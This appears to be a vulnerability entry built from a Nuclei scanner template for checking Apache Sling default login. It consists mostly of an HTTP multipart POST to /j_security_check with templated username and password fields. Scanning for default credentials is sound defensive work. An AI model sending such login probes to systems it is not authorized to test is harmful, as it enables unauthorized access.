# Vulnerability: Apache Sling - Default Login
**Classification:** APACHE
**Source:** Nuclei Template (`apache-sling-default-login.yaml`)

## Description
Apache Sling default login was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBCQeiTztQvBDyNxA

------WebKitFormBoundaryBCQeiTztQvBDyNxA
Content-Disposition: form-data; name="_charset_"

UTF-8
------WebKitFormBoundaryBCQeiTztQvBDyNxA
Content-Disposition: form-data; name="resource"

/
------WebKitFormBoundaryBCQeiTztQvBDyNxA
Content-Disposition: form-data; name="j_username"

{{username}}
------WebKitFormBoundaryBCQeiTztQvBDyNxA
Content-Disposition: form-data; name="j_password"

{{password}}
------WebKitFormBoundaryBCQeiTztQvBDyNxA--
```

